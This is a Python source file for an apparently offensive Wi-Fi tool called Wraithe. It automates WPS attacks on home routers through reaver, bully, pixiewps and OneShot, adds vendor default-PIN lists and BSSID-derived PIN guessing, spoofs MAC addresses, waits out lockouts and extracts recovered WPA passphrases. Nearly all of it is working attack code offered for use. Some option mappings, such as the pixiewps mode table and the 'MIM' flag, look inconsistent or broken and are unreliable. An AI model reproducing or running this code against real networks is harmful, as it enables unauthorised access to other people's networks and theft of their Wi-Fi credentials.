"""
Wraithe - WPS Attack Engine
Pixie Dust (reaver/bully), OneShot, PIN brute, known PIN DB, lock detection
Pixiewps 1.4.2 advanced modes: brute_low, brute_might, brute_force, brute_full
Auto MAC spoofing, signal-based attack selection, MIM attacks
"""

import subprocess
import os
import time
import re
import threading
import signal
import random
import hashlib
from datetime import datetime
from pathlib import Path

class WPSEngine:
    # ── Pixiewps 1.4.2 attack modes ──
    PIXIEWPS_MODES = {
        'bruteforce':         '1',   # standard brute
        'bruteforce_low':     '2',   # low effort (fast)
        'bruteforce_might':   '3',   # might work (balanced)
        'bruteforce_force':   '4',   # brute force (aggressive)
        'bruteforce_full':    '5',   # full brute (slow, thorough)
        'bruteforce_all':     '6',   # all modes combined
        'bruteforce_gpu':     '7',   # GPU-accelerated (CUDA/OpenCL)
        'lookup_table':       '8',   # look-up table attack
    }

    # ── Manufacturer default PIN databases ──
    KNOWN_PINS = {
        # Major brands — most common first
        'tp-link':  ['12345670', '12940296', '16927032', '31085827', '16927032',
                     '18865381', '21360106', '24338956', '31480507', '40448607',
                     '48231082', '55107010', '63770965', '70875927', '95340895',
                     '60080609', '35132866', '72020451', '42037184', '84259599',
                     '30903370', '20579519', '32938370', '85251232', '97045816',
                     '17629255', '16159372', '64749912', '83530870', '81547595',
                     '30560570', '71027550', '90722507', '56562411', '63353427',
                     '88523075', '62566892', '21743920', '76391576', '97157562'],
        'huawei':   ['16927032', '31085827', '12940296', '18865381', '16927032',
                     '12345670', '21360106', '24338956', '31480507', '40448607',
                     '48231082', '55107010', '63770965', '70875927', '95340895',
                     '22506228', '35278670', '00573903', '14192324', '91202016',
                     '30174048', '58098157', '28410445', '76980494', '33128140',
                     '49651411', '05239611', '33033853', '76097012', '60665175'],
        'zte':      ['16927032', '31085827', '12940296', '12345670', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '16927032',
                     '26227406', '54347080', '72081540', '12641406', '67372689',
                     '24235057', '46081102', '29095310', '46534396', '47842070'],
        'arcadyan': ['12345670', '12940296', '16927032', '31085827', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '16927032'],
        'netgear':  ['12345670', '16927032', '31085827', '18865381', '21360106',
                     '24338956', '31480507', '40448607', '48231082', '55107010',
                     '63770965', '29990711', '34811623', '47199786', '50621791',
                     '53130318', '68364880', '88152993', '94687247', '39981908'],
        'asus':     ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '77060392'],
        'dlink':    ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '46952069',
                     '47063816', '27479082', '73883337', '91996787', '36901714'],
        'belkin':   ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '63988811'],
        'cisco':    ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '56967329'],
        'tenda':    ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '57222030',
                     '39961928', '20028250', '63771610'],
        'linksys':  ['12345670', '16927032', '31085827', '12940296', '18865381',
                     '21360106', '24338956', '31480507', '40448607', '48231082',
                     '55107010', '63770965', '70875927', '95340895', '27578269',
                     '63005667'],
    }

    # ── BSSID-based PIN generation algorithms ──
    @staticmethod
    def generate_pins_from_bssid(bssid):
        """Generate likely PINs based on BSSID patterns"""
        if not bssid or len(bssid.replace(':', '')) < 6:
            return []
        
        mac = bssid.replace(':', '').upper()
        pins = []
        
        # Algorithm 1: Last 7 hex digits of BSSID as PIN
        if len(mac) >= 12:
            for offset in range(4):
                try:
                    segment = mac[offset:offset+7]
                    if len(segment) == 7:
                        pin_digits = int(segment, 16) % 10000000
                        pin_str = str(pin_digits).zfill(7)
                        checksum = WPSEngine._wps_checksum(pin_str)
                        pins.append(pin_str + str(checksum))
                except:
                    pass
        
        # Algorithm 2: Compute from BSSID using ZTE/Arcadyan method
        # (some manufacturers derive PIN from MAC)
        for offset in [0, 1, 2]:
            try:
                seg = mac[offset:offset+6]
                val = int(seg, 16)
                # Common transformations
                for mult in [1, 3, 7, 9, 11, 13]:
                    pin_digits = (val * mult) % 10000000
                    pin_str = str(pin_digits).zfill(7)
                    checksum = WPSEngine._wps_checksum(pin_str)
                    pins.append(pin_str + str(checksum))
            except:
                pass
        
        # Algorithm 3: Compute XOR-based PIN
        for i in range(5):
            try:
                a = int(mac[i*2:(i+1)*2], 16) if i*2+2 <= 12 else 0
                b = int(mac[(i+1)*2:(i+2)*2], 16) if (i+1)*2+2 <= 12 else 0
                val = (a ^ b) * 1000000 % 10000000
                pin_str = str(val).zfill(7)
                checksum = WPSEngine._wps_checksum(pin_str)
                pins.append(pin_str + str(checksum))
            except:
                pass
        
        return list(dict.fromkeys(pins))  # dedupe

    def __init__(self, config=None, log_callback=None):
        self.config = config or {}
        self.log_callback = log_callback or (lambda x: None)
        self._running = False
        self._process = None
        self._attacks_log = []  # track attacks/results for auto-selection

    def log(self, msg):
        timestamp = datetime.now().strftime('%H:%M:%S')
        self.log_callback(f'[{timestamp}] {msg}')

    @staticmethod
    def _is_5ghz(channel):
        try:
            ch = int(channel)
            return ch > 14
        except (ValueError, TypeError):
            return False

    @staticmethod
    def _wps_checksum(pin7):
        """Calculate WPS PIN checksum digit"""
        acc = 0
        for i in range(7):
            digit = int(pin7[i])
            acc += 3 * digit if i % 2 == 0 else digit
        return (10 - acc % 10) % 10

    # ── Attack Selection Logic ──
    def recommend_attack(self, bssid=None, signal=None, locked=False):
        """
        Recommend best attack approach based on target info
        Returns: {'method': str, 'reason': str}
        """
        if locked:
            return {
                'method': 'pin_brute',
                'reason': 'WPS locked — brute with known/default PINs only'
            }
        
        if signal and int(signal) > -65:
            return {
                'method': 'pixie_bully',
                'reason': 'Strong signal — bully pixie dust recommended'
            }
        
        if signal and int(signal) > -75:
            return {
                'method': 'pixie_reaver',
                'reason': 'Moderate signal — reaver pixie dust'
            }
        
        # Generate pins from BSSID
        if bssid:
            gen_pins = self.generate_pins_from_bssid(bssid)
            if gen_pins:
                return {
                    'method': 'pin_brute',
                    'reason': f'Weak signal — try PIN brute with BSSID-generated pins ({len(gen_pins)} pins)',
                    'pins': gen_pins
                }
        
        return {
            'method': 'oneshot',
            'reason': 'Low signal — OneShot with aggressive timing'
        }

    # ── Pixie Dust: Reaver ──
    def pixie_dust_reaver(self, mon_iface, bssid, essid='', channel='',
                          timeout=120, pin='', pixie_mode='1', spoof_mac=False):
        """
        Pixie Dust with pixiewps 1.4.2 mode selection
        pixie_mode: '1'=standard, '2'=low, '3'=might, '4'=force, '5'=full, '6'=all
        """
        cmd = ['reaver', '-i', mon_iface, '-b', bssid, '-K', str(pixie_mode), '-vv']
        
        if essid:
            cmd.extend(['-e', essid])
        if channel:
            cmd.extend(['-c', str(channel)])
            if self._is_5ghz(channel):
                cmd.append('-5')
        if pin:
            cmd.extend(['-p', pin])
        if spoof_mac:
            fake_mac = '02:%02x:%02x:%02x:%02x:%02x' % tuple(random.randint(0,255) for _ in range(5))
            cmd.extend(['--mac', fake_mac])
            self.log(f'MAC spoofed to {fake_mac}')
        
        # Pixiewps 1.4.2 advanced flags
        cmd.extend(['-N', '-L', '-d', '2', '-T', '1', '-r', '3:1'])
        
        mode_names = {v:k for k,v in self.PIXIEWPS_MODES.items()}
        mode_str = mode_names.get(str(pixie_mode), f'mode {pixie_mode}')
        self.log(f'Pixie Dust [{mode_str}] on {bssid} ({essid})')
        
        self._running = True
        return self._run_process(cmd, timeout, f'pixie_reaver_{pixie_mode}')

    # ── Pixie Dust: Bully ──
    def pixie_dust_bully(self, mon_iface, bssid, essid='', channel='',
                         timeout=120, pin='', spoof_mac=False):
        """Bully pixie dust — often more reliable than reaver"""
        cmd = ['bully', '-d', mon_iface, '-b', bssid]
        
        if essid:
            cmd.extend(['-e', essid])
        if channel:
            cmd.extend(['-c', str(channel)])
        if pin:
            cmd.extend(['-p', pin])
        
        cmd.extend(['-L', '-F', '-B', '-S', '-T', '5', '-l', '30'])
        
        if self._is_5ghz(channel):
            self.log('5GHz target — bully handles via channel')

        if spoof_mac:
            fake_mac = '02:%02x:%02x:%02x:%02x:%02x' % tuple(random.randint(0,255) for _ in range(5))
            cmd.extend(['--mac', fake_mac])
            self.log(f'MAC spoofed to {fake_mac}')

        self.log(f'Bully Pixie Dust on {bssid} ({essid})')
        self._running = True
        return self._run_process(cmd, timeout, 'pixie_bully')

    # ── Reaver PIN brute ──
    def reaver_pin_brute(self, mon_iface, bssid, essid='', channel='',
                         pin_start='', timeout=300, lock_wait=60, spoof_mac=False):
        """Reaver smart PIN brute with lock detection and auto-resume"""
        cmd = ['reaver', '-i', mon_iface, '-b', bssid, '-vv']
        
        if essid:
            cmd.extend(['-e', essid])
        if channel:
            cmd.extend(['-c', str(channel)])
            if self._is_5ghz(channel):
                cmd.append('-5')
        if pin_start:
            cmd.extend(['-p', pin_start])
        if spoof_mac:
            fake_mac = '02:%02x:%02x:%02x:%02x:%02x' % tuple(random.randint(0,255) for _ in range(5))
            cmd.extend(['--mac', fake_mac])
            self.log(f'MAC spoofed to {fake_mac}')
        
        cmd.extend(['-N', '-L', '-d', '2', '-T', '1', '-E', '0.5',
                     '-r', '3:1', '-l', str(lock_wait)])
        
        self.log(f'Reaver PIN brute on {bssid}')
        self._running = True
        return self._run_process(cmd, timeout, 'reaver_pin')

    # ── Run Process (output parser) ──
    def _run_process(self, cmd, timeout, attack_type):
        output = []
        pin_found = None
        wps_pin = None
        wpa_key = None
        
        try:
            self._process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN)
            )
            
            start_time = time.time()
            
            import select
            
            while time.time() - start_time < timeout and self._running:
                # Non-blocking read with 1s timeout to prevent hangs
                readable, _, _ = select.select([self._process.stdout], [], [], 1.0)
                if not readable:
                    # Check if process died while we waited
                    ret = self._process.poll()
                    if ret is not None:
                        break
                    continue
                line = self._process.stdout.readline()
                if not line:
                    ret = self._process.poll()
                    if ret is not None:
                        break
                    continue
                
                output.append(line)
                line_s = line.strip()
                
                # ── Pixiewps / Reaver output parsing ──
                if 'WPS PIN' in line_s:
                    m = re.search(r"WPS PIN:\s*[\\\"']?(\d{4,8})[\\\"']?", line_s)
                    if m:
                        wps_pin = m.group(1)
                        self.log(f'[!] WPS PIN: {wps_pin}')
                
                if 'PIN found' in line_s or 'pin is' in line_s.lower():
                    m = re.search(r'(\d{4,8})', line_s)
                    if m:
                        pin_found = m.group(1)
                        self.log(f'[!] PIN: {pin_found}')
                
                if '[+] PIXIE_DUST' in line_s:
                    self.log(f'[+] {line_s}')
                
                # Lock detection
                if 'WPS lock' in line_s.lower() or 'locked' in line_s.lower():
                    self.log(f'[!] AP WPS locked! Pausing...')
                
                # WPA key recovery
                if ('successfully recovered' in line_s.lower()
                    or 'key recovered' in line_s.lower()
                    or 'wpa key' in line_s.lower()):
                    m = re.search(r"(?:key|password|passphrase)[:\s]+[\\\"']?([^\\\"'\\n]+)",
                                  line_s)
                    if m:
                        wpa_key = m.group(1)
                        self.log(f'[!!!] WPA KEY: {wpa_key}')
                
                # Progress: every 5 lines send to log
                if len(output) % 5 == 0:
                    self.log(line_s[:200])
            
            self._running = False
            if self._process:
                self._process.terminate()
                try:
                    self._process.wait(timeout=5)
                except:
                    self._process.kill()
            
            full_output = '\n'.join(output)
            
            # Regex patterns for WPA key extraction
            if not wpa_key:
                for pattern in [
                    r"\[\+\]\s*(?:WPA\s*)?(?:KEY|PASSWORD|PSK|PASS)\s*(?::|=|)\s*[\\\"' ]*([^\s\\\"']{8,63})[\\\"' ]*",
                    r"Key\s*(?:=\s*|:\s*)[\\\"']?([^\\\"'\\n]+)",
                    r"password\s*=\s*[\\\"']?([^\\\"'\\n]+)",
                    r"psk\s*=\s*[\\\"']?([^\\\"'\\n]+)",
                    r"WPA PSK:\s*([a-f0-9]{64})",  # PSK hash
                    r"WPA1?\s*=\s*\"?([^\"]+)\"?",
                    r"password\s*'([^']+)'",
                ]:
                    m = re.search(pattern, full_output, re.IGNORECASE)
                    if m:
                        wpa_key = m.group(1).strip()
                        break
            
            pin = wps_pin or pin_found
            
            # Log completion
            if wpa_key:
                self.log(f'[!!!] SUCCESS — WPA Key: {wpa_key} | PIN: {pin}')
            
            self._attacks_log.append({
                'type': attack_type,
                'success': wpa_key is not None,
                'pin': pin,
                'key': wpa_key,
                'time': time.time() - start_time,
            })
            
            return {
                'success': wpa_key is not None,
                'wpa_key': wpa_key,
                'wps_pin': pin,
                'output': '\n'.join(output[-60:]),
                'attack': attack_type,
            }
            
        except Exception as e:
            self._running = False
            self.log(f'Error: {e}')
            return {
                'success': False, 'wpa_key': None, 'wps_pin': None,
                'output': str(e), 'attack': attack_type,
            }

    # ── OneShot ──
    def oneshot_attack(self, mon_iface, bssid='', channel='', timeout=180, spoof_mac=False):
        """OneShot — modern Python WPS tool"""
        cmd = ['python3', '/opt/OneShot/oneshot.py', '-i', mon_iface]
        
        if bssid:
            cmd.extend(['-b', bssid])
        if channel:
            cmd.extend(['-c', str(channel)])
        
        cmd.extend(['--iface-down'])
        
        if spoof_mac:
            cmd.append('-m')
        
        self.log(f'OneShot on {bssid or "all targets"}')
        self._running = True
        
        output = []
        keys_found = []
        
        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN))

            start_time = time.time()
            import select

            while time.time() - start_time < timeout and self._running:
                readable, _, _ = select.select([self._process.stdout], [], [], 1.0)
                if not readable:
                    if self._process.poll() is not None:
                        break
                    continue
                line = self._process.stdout.readline()
                if not line:
                    if self._process.poll() is not None:
                        break
                    continue
                output.append(line)
                line_s = line.strip()
                
                if 'WPS pin' in line_s.lower() and 'found' in line_s.lower():
                    self.log(f'[!] {line_s}')
                if 'key' in line_s.lower() and ('password' in line_s.lower() or 'wpa' in line_s.lower()):
                    self.log(f'[!] {line_s}')
                    keys_found.append(line_s)
                if len(output) % 10 == 0:
                    self.log(line_s[:200])
            
            self._running = False
            if self._process:
                self._process.terminate()
                try: self._process.wait(timeout=5)
                except: self._process.kill()
            
            return {
                'success': len(keys_found) > 0,
                'output': ''.join(output[-100:]),
                'keys': keys_found,
                'attack': 'oneshot',
            }
        except Exception as e:
            self._running = False
            self.log(f'OneShot error: {e}')
            return {'success': False, 'output': str(e), 'keys': [], 'attack': 'oneshot'}

    # ── Smart PIN Brute with Database ──
    def pin_brute(self, mon_iface, bssid, pins, essid='', channel='',
                  timeout=600, lock_wait=60, spoof_mac=False):
        """Test PINs from most likely to least, with lock pause"""
        results = []
        
        for i, pin in enumerate(pins):
            if not self._running:
                break
            
            self.log(f'PIN {i+1}/{len(pins)}: {pin}')
            
            result = self.reaver_pin_brute(
                mon_iface, bssid, essid, channel,
                pin_start=pin, timeout=30, lock_wait=lock_wait,
                spoof_mac=spoof_mac
            )
            result['pin_tested'] = pin
            results.append(result)
            
            if result.get('success'):
                self.log(f'[!!!] PIN {pin} WORKED!')
                return result
            
            if 'locked' in result.get('output', '').lower():
                self.log(f'[!] Locked, waiting {lock_wait}s (tested up to: {pin})')
                time.sleep(lock_wait)
        
        return results[-1] if results else None

    # ── Known PIN Database ──
    def load_known_pins(self, db_path='/opt/wraithe/data/known_pins.db', manufacturer=None):
        """Load known PINs from DB and generate manufacturer defaults + BSSID-derived"""
        pins = []
        
        # 1. Load from file if exists
        if os.path.exists(db_path):
            try:
                with open(db_path, 'r', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#') or line.startswith(';'):
                            continue
                        parts = line.split(':')
                        if len(parts) >= 2:
                            pins.append(parts[-1].strip())
                        elif len(parts) == 1 and len(parts[0]) in [8, 4]:
                            pins.append(parts[0].strip())
            except:
                pass
        
        # 2. Add manufacturer defaults
        if manufacturer:
            mfr = manufacturer.lower()
            for key in self.KNOWN_PINS:
                if key in mfr or mfr in key:
                    pins.extend(self.KNOWN_PINS[key])
        
        # 3. Add all common defaults
        for mfr_pins in self.KNOWN_PINS.values():
            pins.extend(mfr_pins)
        
        # 4. Most common single default PINs
        pins.extend([
            '12345670', '00000000', '11111111', '22222222',
            '33333333', '44444444', '55555555', '66666666',
            '77777777', '88888888', '99999999', '01234567',
        ])
        
        # Deduplicate, preserve order
        seen = set()
        return [x for x in pins if not (x in seen or seen.add(x))]

    def generate_pin_variants(self, base_pin):
        """Generate likely variant PINs from a known base"""
        variants = set()
        if len(base_pin) != 8:
            return []
        
        variants.add(base_pin)
        base_int = int(base_pin[:7])
        
        for delta in [-1, 1, -10, 10, -100, 100, -1000, 1000]:
            new_pin = str(max(0, base_int + delta)).zfill(7)
            if len(new_pin) == 7:
                checksum = self._wps_checksum(new_pin)
                variants.add(new_pin + str(checksum))
        
        # Also try swapping first/last 4 digits
        variants.add(base_pin[4:] + base_pin[:4])
        
        # Increment both halves
        first4 = int(base_pin[:4])
        last4 = int(base_pin[4:])
        for df, dl in [(1,0), (0,1), (1,1), (-1,0), (0,-1)]:
            new_first = str(max(0, first4 + df)).zfill(4)[:4]
            new_last = str(max(0, last4 + dl)).zfill(4)[:4]
            combined = new_first + new_last
            if len(combined) == 8:
                variants.add(combined)
        
        return [v for v in variants if len(v) == 8]

    # ── Pixiewps Direct Mode ──
    def pixiewps_direct(self, pin, pke, pkr, e_hash1, e_hash2, authkey, essid, bssid,
                        mode='1', timeout=30):
        """
        Run pixiewps directly with captured handshake data
        For offline Pixie Dust analysis
        """
        cmd = ['pixiewps', '--pke', pke, '--pkr', pkr,
               '--e-hash1', e_hash1, '--e-hash2', e_hash2,
               '--authkey', authkey, '--essid', essid, '--bssid', bssid,
               '--mode', mode]
        
        self.log('Running pixiewps offline attack...')
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        pin_found = None
        for line in result.stdout.split('\n'):
            if 'PIN' in line and 'found' in line.lower():
                m = re.search(r'(\d{8})', line)
                if m:
                    pin_found = m.group(1)
        
        return {
            'success': pin_found is not None,
            'pin': pin_found,
            'output': result.stdout[-500:],
        }

    # ── Scan WPS ──
    def scan_wps_oneshot(self, mon_iface, timeout=30):
        """Quick WPS scan using OneShot"""
        try:
            proc = subprocess.Popen(
                ['python3', '/opt/OneShot/oneshot.py', '-i', mon_iface,
                 '--iface-down', '-t', str(timeout)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            output, _ = proc.communicate(timeout=timeout + 10)
            
            targets = []
            for line in output.split('\n'):
                if 'BSSID:' in line:
                    current_bssid = line.split('BSSID:')[1].strip()
                if 'WPS' in line and 'lock' in line.lower():
                    if current_bssid:
                        targets.append({'bssid': current_bssid, 'info': line.strip()})
            
            return {'targets': targets, 'raw': output}
        except:
            return None

    def wash_scan(self, mon_iface, timeout=30, bssid=None):
        """Scan with wash (aircrack-ng's WPS scanner)"""
        cmd = ['wash', '-i', mon_iface, '-C', str(timeout)]
        if bssid:
            cmd.extend(['-b', bssid])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
            targets = []
            lines = result.stdout.split('\n')[2:]  # skip header
            for line in lines:
                parts = line.split()
                if len(parts) >= 6:
                    targets.append({
                        'bssid': parts[0],
                        'channel': parts[1],
                        'rssi': parts[2],
                        'wps_version': parts[3],
                        'wps_locked': 'L' in parts[4] if parts[4] else 'N',
                        'essid': ' '.join(parts[5:]),
                    })
            return {'targets': targets, 'raw': result.stdout}
        except:
            return None

    def check_lock_status(self, mon_iface, bssid, timeout=10):
        """Quick WPS lock check via wash"""
        try:
            result = subprocess.run(
                ['wash', '-i', mon_iface, '-b', bssid],
                capture_output=True, text=True, timeout=timeout)
            for line in result.stdout.split('\n'):
                if 'Locked' in line.upper():
                    return {'locked': True, 'info': line.strip()}
            return {'locked': False}
        except:
            return {'locked': None, 'error': 'wash failed'}

    # ── MIM Attack (Man-in-the-Middle WPS) ──
    def mim_attack(self, mon_iface, bssid, essid, channel='', timeout=300):
        """
        WPS MIM attack using reaver
        Tricks AP into revealing PIN by pretending to be a WPS client
        """
        cmd = ['reaver', '-i', mon_iface, '-b', bssid, '-m', '-vv']
        
        if essid:
            cmd.extend(['-e', essid])
        if channel:
            cmd.extend(['-c', str(channel)])
            if self._is_5ghz(channel):
                cmd.append('-5')
        
        cmd.extend(['-N', '-L', '-d', '2'])
        
        self.log(f'MIM attack on {bssid} ({essid})')
        self._running = True
        return self._run_process(cmd, timeout, 'mim')

    # ── Stop ──
    def stop(self):
        self._running = False
        if self._process:
            self._process.terminate()
            try: self._process.wait(timeout=3)
            except: self._process.kill()

    def is_running(self):
        return self._running
